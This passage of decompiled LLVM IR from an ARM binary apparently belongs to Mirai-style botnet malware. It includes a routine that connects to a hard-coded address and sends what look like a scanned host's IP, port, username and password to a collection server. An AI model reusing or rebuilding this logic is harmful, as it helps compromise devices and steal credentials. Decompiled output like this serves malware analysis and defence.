  %v1_fb5c = call i32 @table_lock_val(i32 30)
  store i32 %v1_fb5c, i32* %r0.global-to-local, align 4
  %v0_fb60 = load i32, i32* @r6, align 4
  %v1_fb60 = add i32 %v0_fb60, 12
  %v2_fb60 = inttoptr i32 %v1_fb60 to i32*
  %v3_fb60 = load i32, i32* %v2_fb60, align 4
  store i32 %v3_fb60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef78.backedge

dec_label_pc_fb68:                                ; preds = %dec_label_pc_fa84
  %v0_fb68 = load i32, i32* @r6, align 4
  %v1_fb68 = add i32 %v0_fb68, 4
  %v2_fb68 = inttoptr i32 %v1_fb68 to i32*
  %v3_fb68 = load i32, i32* %v2_fb68, align 4
  store i32 %v3_fb68, i32* %r0.global-to-local, align 4
  %v1_fb6c = call i32 @__GI___libc_close(i32 %v3_fb68)
  store i32 %v1_fb6c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_fb74 = load i32, i32* @r4, align 4
  %v1_fb74 = load i32, i32* @r6, align 4
  %v2_fb74 = add i32 %v1_fb74, 12
  %v3_fb74 = inttoptr i32 %v2_fb74 to i32*
  store i32 %v0_fb74, i32* %v3_fb74, align 4
  %v0_fb78 = load i32, i32* %r3.global-to-local, align 4
  %v1_fb78 = load i32, i32* @r6, align 4
  %v2_fb78 = add i32 %v1_fb78, 4
  %v3_fb78 = inttoptr i32 %v2_fb78 to i32*
  store i32 %v0_fb78, i32* %v3_fb78, align 4
  %v0_fb7c = load i32, i32* @r4, align 4
  %v1_fb7c = trunc i32 %v0_fb7c to i8
  %v2_fb7c = load i32, i32* @r6, align 4
  %v3_fb7c = add i32 %v2_fb7c, 284
  %v4_fb7c = inttoptr i32 %v3_fb7c to i8*
  store i8 %v1_fb7c, i8* %v4_fb7c, align 1
  br label %dec_label_pc_f07c

dec_label_pc_fb84:                                ; preds = %dec_label_pc_f02c
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_fb88 = load i32, i32* @fp, align 4
  %v2_fb88 = inttoptr i32 %v1_fb88 to i32*
  store i32 104, i32* %v2_fb88, align 4
  br label %dec_label_pc_f044

dec_label_pc_fb90:                                ; preds = %thread-pre-split124
  store i32 %v1_fb94, i32* %r0.global-to-local, align 4
  %v0_fb98 = load i32, i32* @r6, align 4
  %v1_fb98 = add i32 %v0_fb98, 12
  %v2_fb98 = inttoptr i32 %v1_fb98 to i32*
  %v3_fb98 = load i32, i32* %v2_fb98, align 4
  store i32 %v3_fb98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef78.backedge

dec_label_pc_ef78.backedge.thread:                ; preds = %dec_label_pc_f138, %dec_label_pc_f20c, %dec_label_pc_f3b0, %dec_label_pc_f484, %dec_label_pc_f5d0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef80

dec_label_pc_ef78.backedge.thread561:             ; preds = %dec_label_pc_f4e8, %dec_label_pc_f414, %dec_label_pc_f634, %dec_label_pc_f270, %dec_label_pc_f19c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef80

dec_label_pc_ef78.backedge:                       ; preds = %dec_label_pc_eff4, %dec_label_pc_fb90, %dec_label_pc_fb50
  %v0_ef80228 = phi i32 [ %v0_fb60, %dec_label_pc_fb50 ], [ %v0_fb98, %dec_label_pc_fb90 ], [ %v0_eff4, %dec_label_pc_eff4 ]
  %v0_ef78.be = phi i32 [ %v3_fb60, %dec_label_pc_fb50 ], [ %v3_fb98, %dec_label_pc_fb90 ], [ %v3_eff4, %dec_label_pc_eff4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef78 = icmp eq i32 %v0_ef78.be, 0
  store i1 %v2_ef78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef78, label %dec_label_pc_f07c, label %dec_label_pc_ef80

dec_label_pc_fba0:                                ; preds = %bb459
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_fbac = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_fbac, i32* %r0.global-to-local, align 4
  %v2_fbb0 = icmp eq i32 %v3_fbac, -1
  store i1 %v2_fbb0, i1* %cpsr_c.global-to-local, align 1
  %v7_fbb0 = icmp eq i32 %v3_fbac, -1
  store i1 %v7_fbb0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_fbac, i32* @r4, align 4
  br i1 %v7_fbb0, label %dec_label_pc_fc34, label %dec_label_pc_fbbc

dec_label_pc_fbbc:                                ; preds = %dec_label_pc_fba0
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_fbc0 = call i32 @table_unlock_val(i32 4)
  store i32 %v2_f9e4, i32* @lr, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1926c.91 to i32), i32* @r0, align 4
  %v2_fbd4 = call i32 @inet_addr(i32 ptrtoint ([15 x i8]* @global_var_1926c.91 to i32))
  %v0_fbd8 = load i32, i32* @r5, align 4
  store i32 %v0_fbd8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_fbe4 = inttoptr i32 %v0_fbd8 to i32*
  %v3_fbe4 = call i32 @table_retrieve_val(i32 4, i32* %v2_fbe4)
  store i32 %v2_f9e4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_fbf8 = call i32 @table_lock_val(i32 4)
  %v0_fc00 = load i32, i32* @r4, align 4
  store i32 %v0_fc00, i32* %r0.global-to-local, align 4
  store i32 %v2_e8b4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_fc0c = call i32 @__libc_connect(i32 %v0_fc00, i32 %v2_e8b4, i32 16)
  store i32 %v3_fc0c, i32* %r0.global-to-local, align 4
  %v3_fc10 = icmp eq i32 %v3_fc0c, -1
  store i1 %v3_fc10, i1* %cpsr_c.global-to-local, align 1
  %v8_fc10 = icmp eq i32 %v3_fc0c, -1
  store i1 %v8_fc10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_fc10, label %dec_label_pc_fc18, label %dec_label_pc_fc3c

dec_label_pc_fc18:                                ; preds = %dec_label_pc_fbbc
  %v0_fc18 = load i32, i32* @r4, align 4
  store i32 %v0_fc18, i32* %r0.global-to-local, align 4
  %v1_fc1c = call i32 @__GI___libc_close(i32 %v0_fc18)
  %v0_fc20 = load i32, i32* @r5, align 4
  store i32 %v0_fc20, i32* %r0.global-to-local, align 4
  %v1_fc24 = call i32 @__GI_exit(i32 %v0_fc20)
  store i32 %v1_fc24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc28

dec_label_pc_fc28:                                ; preds = %dec_label_pc_e684, %dec_label_pc_fc18
  store i32 ptrtoint (i32* @global_var_2473c.153 to i32), i32* %ip.global-to-local, align 4
  %v2_fc2c = load i32, i32* @global_var_2473c.153, align 4
  store i32 %v2_fc2c, i32* %r0.global-to-local, align 4
  %v1_fc30 = call i32 @__GI___libc_close(i32 %v2_fc2c)
  store i32 %v1_fc30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc34

dec_label_pc_fc34:                                ; preds = %dec_label_pc_e660.dec_label_pc_fc34_crit_edge, %dec_label_pc_fba0, %dec_label_pc_fc3c, %dec_label_pc_fc28
  %.pre.pre-phi = phi i32 [ %.pre283, %dec_label_pc_e660.dec_label_pc_fc34_crit_edge ], [ %v2_e6a8, %dec_label_pc_fba0 ], [ %v2_fc3c.pre-phi, %dec_label_pc_fc3c ], [ %v2_e6a8, %dec_label_pc_fc28 ]
  %v0_fc34 = load i32, i32* @r5, align 4
  store i32 %v0_fc34, i32* %r0.global-to-local, align 4
  %v1_fc38 = call i32 @__GI_exit(i32 %v0_fc34)
  store i32 %v1_fc38, i32* %r0.global-to-local, align 4
  %.pre281 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_fc3c

dec_label_pc_fc3c:                                ; preds = %dec_label_pc_fbbc, %dec_label_pc_fc34
  %v2_fc5c.pre-phi = phi i32 [ %v2_f828, %dec_label_pc_fbbc ], [ %.pre281, %dec_label_pc_fc34 ]
  %v2_fc3c.pre-phi = phi i32 [ %v2_e6a8, %dec_label_pc_fbbc ], [ %.pre.pre-phi, %dec_label_pc_fc34 ]
  store i32 %v2_fc3c.pre-phi, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc48 = load i32, i32* @r4, align 4
  store i32 %v0_fc48, i32* %r0.global-to-local, align 4
  %v0_fc4c = load i32, i32* @r5, align 4
  %v6_fc4c = trunc i32 %v0_fc4c to i8
  store i8 %v6_fc4c, i8* %stack_var_-56, align 1
  %v6_fc50 = call i32 @__libc_send(i32 %v0_fc48, i32 %v2_fc3c.pre-phi, i32 1, i32 16384)
  %v0_fc58 = load i32, i32* @r4, align 4
  store i32 %v0_fc58, i32* %r0.global-to-local, align 4
  store i32 %v2_fc5c.pre-phi, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc68 = call i32 @__libc_send(i32 %v0_fc58, i32 %v2_fc5c.pre-phi, i32 4, i32 16384)
  %v0_fc70 = load i32, i32* @r4, align 4
  store i32 %v0_fc70, i32* %r0.global-to-local, align 4
  %v2_fc74 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_fc74, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc80 = call i32 @__libc_send(i32 %v0_fc70, i32 %v2_fc74, i32 2, i32 16384)
  %v0_fc84 = load i32, i32* @r8, align 4
  %v1_fc84 = add i32 %v0_fc84, 12
  store i32 %v1_fc84, i32* %r1.global-to-local, align 4
  %v0_fc88 = load i32, i32* @r4, align 4
  store i32 %v0_fc88, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc94 = call i32 @__libc_send(i32 %v0_fc88, i32 %v1_fc84, i32 1, i32 16384)
  store i32 %v4_fc94, i32* %r0.global-to-local, align 4
  %v0_fc98 = load i32, i32* @r8, align 4
  %v1_fc98 = inttoptr i32 %v0_fc98 to i32*
  %v2_fc98 = load i32, i32* %v1_fc98, align 4
  store i32 %v2_fc98, i32* %r1.global-to-local, align 4
  %v1_fc9c = add i32 %v0_fc98, 12
  %v2_fc9c = inttoptr i32 %v1_fc9c to i8*
  %v3_fc9c = load i8, i8* %v2_fc9c, align 1
  %v4_fc9c = zext i8 %v3_fc9c to i32
  store i32 %v4_fc9c, i32* %r2.global-to-local, align 4
  %v0_fca0 = load i32, i32* @r4, align 4
  store i32 %v0_fca0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fca8 = call i32 @__libc_send(i32 %v0_fca0, i32 %v2_fc98, i32 %v4_fc9c, i32 16384)
  %v0_fcac = load i32, i32* @r8, align 4
  %v1_fcac = add i32 %v0_fcac, 13
  store i32 %v1_fcac, i32* %r1.global-to-local, align 4
  %v0_fcb0 = load i32, i32* @r4, align 4
  store i32 %v0_fcb0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fcbc = call i32 @__libc_send(i32 %v0_fcb0, i32 %v1_fcac, i32 1, i32 16384)
  %v0_fcc0 = load i32, i32* @r4, align 4
  store i32 %v0_fcc0, i32* %r0.global-to-local, align 4
  %v0_fcc4 = load i32, i32* @r8, align 4
  %v1_fcc4 = add i32 %v0_fcc4, 13
  %v2_fcc4 = inttoptr i32 %v1_fcc4 to i8*
  %v3_fcc4 = load i8, i8* %v2_fcc4, align 1
  %v4_fcc4 = zext i8 %v3_fcc4 to i32
  store i32 %v4_fcc4, i32* %r2.global-to-local, align 4
  %v1_fcc8 = add i32 %v0_fcc4, 4
  %v2_fcc8 = inttoptr i32 %v1_fcc8 to i32*
  %v3_fcc8 = load i32, i32* %v2_fcc8, align 4
  store i32 %v3_fcc8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fcd0 = call i32 @__libc_send(i32 %v0_fcc0, i32 %v3_fcc8, i32 %v4_fcc4, i32 16384)
  %v0_fcd4 = load i32, i32* @r4, align 4
  store i32 %v0_fcd4, i32* %r0.global-to-local, align 4
  %v1_fcd8 = call i32 @__GI___libc_close(i32 %v0_fcd4)
  store i32 %v1_fcd8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc34

; uselistorder directives
  uselistorder i32 %v2_fc3c.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v2_fc5c.pre-phi, { 1, 0 }
  uselistorder i1 %v7_fbb0, { 1, 0 }
  uselistorder i32 %v3_fbac, { 1, 0, 2, 3 }
  uselistorder i32 %v3_fb30, { 1, 0 }
  uselistorder i1 %v3_fb20, { 1, 0 }
  uselistorder i32 %v0_fb04, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v3_fad0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_facc, { 1, 0 }
  uselistorder i32 %v0_fac4, { 1, 0 }
  uselistorder i32 %v3_fa44, { 1, 0 }
  uselistorder i1 %v2_fa10, { 1, 0 }
  uselistorder i32 %.465, { 1, 0 }
  uselistorder i1 %v7_f9f8, { 1, 0 }
  uselistorder i32 %v0_f9f4, { 2, 1, 0, 3 }
  uselistorder i1 %v7_f9cc, { 1, 0 }
  uselistorder i32 %v0_f9cc, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f91c.pr, { 1, 0 }
  uselistorder i32 %v0_f8e8, { 1, 2, 0 }
  uselistorder i32 %v4_f888, { 1, 0, 2 }
  uselistorder i1 %v7_f864, { 1, 0 }
  uselistorder i32 %v1_f80c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f80c, { 0, 2, 1 }
  uselistorder i32 %v0_f804, { 1, 0 }
  uselistorder i1 %v7_f800, { 1, 0 }
  uselistorder i1 %v7_f7f8, { 1, 0 }
  uselistorder i1 %v7_f7f0, { 1, 0 }
  uselistorder i1 %v8_f7e8, { 1, 0 }
  uselistorder i1 %v7_f7cc, { 1, 0 }
  uselistorder i1 %v7_f7c4, { 1, 0 }
  uselistorder i1 %v7_f7bc, { 1, 0 }
  uselistorder i1 %v8_f7b4, { 1, 0 }
  uselistorder i32 %v1_f79c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v0_f748, { 1, 0 }
  uselistorder i32 %v4_f73c, { 1, 0, 2 }
  uselistorder i32 %v1_f708, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_f708, { 0, 2, 1 }
  uselistorder i32 %v0_f700, { 1, 0 }
  uselistorder i1 %v7_f6fc, { 1, 0 }
  uselistorder i1 %v7_f6f4, { 1, 0 }
  uselistorder i1 %v8_f6ec, { 1, 0 }
  uselistorder i1 %v7_f6d0, { 1, 0 }
  uselistorder i1 %v7_f6c8, { 1, 0 }
  uselistorder i1 %v8_f6c0, { 1, 0 }
  uselistorder i32 %v1_f6a8, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v8_f644, { 1, 0 }
  uselistorder i8 %v3_f63c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f634, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f634, { 0, 2, 1 }
  uselistorder i32 %v0_f62c, { 1, 0 }
  uselistorder i1 %v7_f628, { 1, 0 }
  uselistorder i1 %v7_f620, { 1, 0 }
  uselistorder i1 %v7_f618, { 1, 0 }
  uselistorder i1 %v7_f604, { 1, 0 }
  uselistorder i1 %v7_f5fc, { 1, 0 }
  uselistorder i1 %v7_f5f4, { 1, 0 }
  uselistorder i1 %v8_f5ec, { 1, 0 }
  uselistorder i32 %v1_f5d4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f4f8, { 1, 0 }
  uselistorder i8 %v3_f4f0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f4e8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f4e8, { 0, 2, 1 }
  uselistorder i32 %v0_f4e0, { 1, 0 }
  uselistorder i1 %v7_f4dc, { 1, 0 }
  uselistorder i1 %v7_f4d4, { 1, 0 }
  uselistorder i1 %v7_f4cc, { 1, 0 }
  uselistorder i1 %v7_f4b8, { 1, 0 }
  uselistorder i1 %v7_f4b0, { 1, 0 }
  uselistorder i1 %v7_f4a8, { 1, 0 }
  uselistorder i1 %v8_f4a0, { 1, 0 }
  uselistorder i32 %v1_f488, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f424, { 1, 0 }
  uselistorder i8 %v3_f41c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f414, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f414, { 0, 2, 1 }
  uselistorder i32 %v0_f40c, { 1, 0 }
  uselistorder i1 %v7_f408, { 1, 0 }
  uselistorder i1 %v7_f400, { 1, 0 }
  uselistorder i1 %v7_f3f8, { 1, 0 }
  uselistorder i1 %v7_f3e4, { 1, 0 }
  uselistorder i1 %v7_f3dc, { 1, 0 }
  uselistorder i1 %v7_f3d4, { 1, 0 }
  uselistorder i1 %v8_f3cc, { 1, 0 }
  uselistorder i32 %v1_f3b4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f3a0, { 1, 0 }
  uselistorder i32 %v1_f398, { 1, 0 }
  uselistorder i32 %v1_f390, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_f38c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_f38c, { 0, 2, 1 }
  uselistorder i32 %v0_f36c.pr, { 1, 0 }
  uselistorder i32 %v0_f34c.pr, { 1, 0 }
  uselistorder i1 %v7_f324, { 1, 0 }
  uselistorder i1 %v2_f314, { 1, 0, 2 }
  uselistorder i1 %v2_f2f8, { 1, 0, 2 }
  uselistorder i32 %v1_f318, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f2ec, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_f31c, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v8_f280, { 1, 0 }
  uselistorder i8 %v3_f278, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f270, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f270, { 0, 2, 1 }
  uselistorder i32 %v0_f268, { 1, 0 }
  uselistorder i1 %v7_f264, { 1, 0 }
  uselistorder i1 %v7_f25c, { 1, 0 }
  uselistorder i1 %v7_f254, { 1, 0 }
  uselistorder i1 %v7_f240, { 1, 0 }
  uselistorder i1 %v7_f238, { 1, 0 }
  uselistorder i1 %v7_f230, { 1, 0 }
  uselistorder i1 %v8_f228, { 1, 0 }
  uselistorder i32 %v1_f210, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f1ac, { 1, 0 }
  uselistorder i8 %v3_f1a4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f19c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f19c, { 0, 2, 1 }
  uselistorder i32 %v0_f194, { 1, 0 }
  uselistorder i1 %v7_f190, { 1, 0 }
  uselistorder i1 %v7_f188, { 1, 0 }
  uselistorder i1 %v7_f180, { 1, 0 }
  uselistorder i1 %v7_f16c, { 1, 0 }
  uselistorder i1 %v7_f164, { 1, 0 }
  uselistorder i1 %v7_f15c, { 1, 0 }
  uselistorder i1 %v8_f154, { 1, 0 }
  uselistorder i32 %v1_f13c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f128, { 1, 2, 0 }
  uselistorder i32 %v2_f114, { 1, 0 }
  uselistorder i32 %v0_f114, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_f110, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_f0e8, { 2, 1, 0 }
  uselistorder i1 %v7_f0c4, { 1, 0 }
  uselistorder i32 %v4_f0c0, { 1, 0, 2 }
  uselistorder i32 %v1_f080, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_f064, { 1, 0 }
  uselistorder i32 %v1_f054, { 2, 1, 0 }
  uselistorder i32 %v1_f050, { 1, 0 }
  uselistorder i32 %v0_eff4, { 2, 5, 6, 20, 7, 8, 21, 9, 10, 24, 11, 12, 22, 13, 14, 23, 4, 3, 19, 15, 16, 25, 17, 18, 26, 27, 1, 0 }
  uselistorder i32 %v1_efd0, { 1, 2, 3, 0 }
  uselistorder i32 %v3_efcc, { 1, 0 }
  uselistorder i32 %v4_efb0, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_ef9c, { 1, 0, 2 }
  uselistorder i32 %v3_ef98, { 1, 0, 2 }
  uselistorder i32 %v0_fa54, { 1, 0, 2 }
  uselistorder i32 %v3_ef64, { 1, 0 }
  uselistorder i32 %v1_ef4c, { 3, 2, 1, 0 }
  uselistorder i32 %v3_ef48, { 1, 0 }
  uselistorder i32 %v3_ef40, { 1, 2, 0 }
  uselistorder i1 %v7_ef30, { 1, 0 }
  uselistorder i32 %v3_ef2c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_ef20, { 1, 0 }
  uselistorder i32 %v1_eec8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_eec8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_eeac, { 0, 2, 1 }
  uselistorder i32 %v1_eea4, { 1, 0 }
  uselistorder i32 %v1_ee64, { 2, 1, 0 }
  uselistorder i32 %v1_ee60, { 1, 0 }
  uselistorder i1 %v2_ee40, { 1, 0, 2 }
  uselistorder i32 %v0_ee3c, { 1, 0, 2 }
  uselistorder i1 %v7_ee08, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_ee08, { 1, 0, 2 }
  uselistorder i32 %v2_ee00, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_edf4, { 1, 0, 2 }
  uselistorder i32 %v0_edf8, { 1, 0 }
  uselistorder i32 %v1_eddc, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_edd0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_edd0, { 0, 2, 1 }
  uselistorder i32 %v1_edc0, { 1, 0 }
  uselistorder i32 %v3_ee8c, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v1_ed20, { 1, 0 }
  uselistorder i32 %v1_ed08, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ed14, { 0, 3, 2, 1 }
  uselistorder i32 %v0_ecc4, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_ecb8, { 2, 1, 0 }
  uselistorder i32 %v1_ec98, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v2_ec74, { 1, 0 }
  uselistorder i1 %v9_ec40, { 1, 0 }
  uselistorder i32 %v0_ebf0, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_eb94, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_eb44, { 1, 0 }
  uselistorder i32 %v5_eadc, { 1, 0 }
  uselistorder i32 %v3_eacc, { 1, 2, 0 }
  uselistorder i16 %v4_eac8, { 1, 0 }
  uselistorder i32 %v3_eac8, { 1, 0 }
  uselistorder i1 %v2_ea04, { 1, 0 }
  uselistorder i1 %v2_e9f0, { 1, 0 }
  uselistorder i1 %v2_e9dc, { 1, 0 }
  uselistorder i32 %.464, { 2, 1, 0 }
  uselistorder i1 %v7_e9b8, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_e9a0, { 1, 0 }
  uselistorder i1 %v3_e984, { 1, 0, 2 }
  uselistorder i1 %v2_e970, { 1, 0 }
  uselistorder i1 %v2_e94c, { 1, 0 }
  uselistorder i32 %v1_e8fc, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e8e8, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_e8e4, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_e8cc, { 1, 0 }
  uselistorder i32 %stack_var_-1876.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_e8b4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_f9e4, { 1, 2, 3, 0 }
  uselistorder i32 %v2_f828, { 0, 2, 1, 4, 11, 12, 10, 7, 9, 8, 6, 5, 3 }
  uselistorder i32 %v2_f8d0, { 1, 2, 0 }
  uselistorder i32 %v2_ee98, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_e88c, { 0, 2, 4, 7, 6, 8, 1, 3, 5, 9, 10 }
  uselistorder i32 %v4_e75c, { 2, 1, 0, 3 }
  uselistorder i16 %v5_e6f0.le, { 1, 0 }
  uselistorder i32 %v0_e6d4, { 3, 2, 0, 1 }
  uselistorder i32 %v2_e6a8, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v7_e674, { 1, 0 }
  uselistorder i32 %v3_e66c, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %v0_e658, { 1, 0 }
  uselistorder i32 %v2_e63c, { 1, 0, 2 }
  uselistorder i32 %v0_e628, { 1, 2, 0 }
  uselistorder i32 %storemerge329, { 1, 0 }
  uselistorder i32 %v0_e59c, { 3, 2, 1, 0, 4 }
  uselistorder i8* %stack_var_-56, { 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-60, { 0, 11, 12, 13, 9, 14, 15, 1, 2, 16, 3, 17, 6, 18, 4, 19, 5, 20, 7, 21, 8, 22, 10, 23 }
  uselistorder i32* %stack_var_-42, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 81, 80, 82, 83, 85, 84, 86, 87, 35, 151, 62, 63, 0, 1, 2, 36, 37, 38, 39, 40, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 50, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 64, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 138, 139, 141, 140, 137, 143, 142, 65, 144, 145, 66, 146, 147, 148, 149, 150, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 113, 164, 165, 88, 89, 90, 91, 92, 93, 94, 95, 97, 96, 99, 98, 107, 100, 101, 102, 103, 104, 105, 106, 108, 109, 110, 111, 112 }
  uselistorder i32* %r2.global-to-local, { 44, 45, 46, 47, 48, 49, 50, 35, 36, 37, 51, 52, 53, 54, 23, 38, 39, 0, 1, 24, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 40, 41, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 96, 81, 82, 98, 99, 101, 100, 97, 102, 103, 42, 105, 104, 43, 106, 107, 108, 109, 110, 111, 112, 113, 114, 95, 115, 116, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80 }
  uselistorder i32* %r1.global-to-local, { 51, 52, 53, 54, 55, 56, 57, 43, 45, 44, 46, 58, 59, 60, 29, 47, 48, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 37, 31, 32, 33, 34, 35, 36, 38, 39, 40, 41, 42, 88, 89, 49, 50, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87 }
